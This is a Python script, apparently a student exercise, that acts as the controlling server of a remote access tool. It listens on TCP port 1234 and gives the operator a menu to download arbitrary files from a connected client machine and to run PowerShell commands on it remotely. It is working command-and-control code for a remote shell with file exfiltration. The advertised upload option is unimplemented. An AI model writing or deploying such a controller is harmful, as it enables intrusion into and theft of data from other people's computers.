import socket
import os


def receive_file(client_socket, file_path):
    save_directory = r"C:\Users\Student\Desktop"  # Specify the directory where you want to save the file
    os.makedirs(save_directory, exist_ok=True)  # Create the directory if it doesn't exist

    try:
        file_name = os.path.basename(file_path.strip())
        abs_file_path = os.path.abspath(os.path.join(save_directory, file_name))
        print(f"Saving file to: {abs_file_path}")

        with open(abs_file_path, "wb") as file:
            while True:
                data = client_socket.recv(4096)
                if not data:
                    break
                print(f"Received data length: {len(data)}")
                file.write(data)
        print(f"File saved successfully at: {abs_file_path}")

        with open(abs_file_path, "rb") as file:
            file_content = file.read()
            print(f"Content of saved file length: {len(file_content)}")

    except OSError as e:
        print(f"OS Error ({e.errno}): {e.strerror}")
    except Exception as e:
        print(f"Error while receiving file: {e}")


def main():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind(('0.0.0.0', 1234))
    server.listen(5)

    print("Server is listening...")

    client_socket, client_address = server.accept()
    print(f"Connection from {client_address}")

    while True:
        choice = input("Enter your choice (1: Download File, 2: Access PowerShell, 3: Upload File, exit: Exit): ")

        if choice == '1':
            command = input("Enter the file path to download from the client: ")
            client_socket.send(f"get {command}".encode('utf-8'))
            receive_file(client_socket, command)
        elif choice == '2':
            while True:
                command = input("Enter command to execute on the client (type 'exit' to return to choice selection): ")
                if command.lower() == 'exit':
                    break
                client_socket.send(command.encode('utf-8'))
                output = client_socket.recv(4096).decode('utf-8')
                print(output)
        elif choice.lower() == 'exit':
            client_socket.send(choice.encode('utf-8'))
            break
        else:
            print("Invalid choice. Please try again.")

    client_socket.close()
    server.close()


if __name__ == "__main__":
    main()
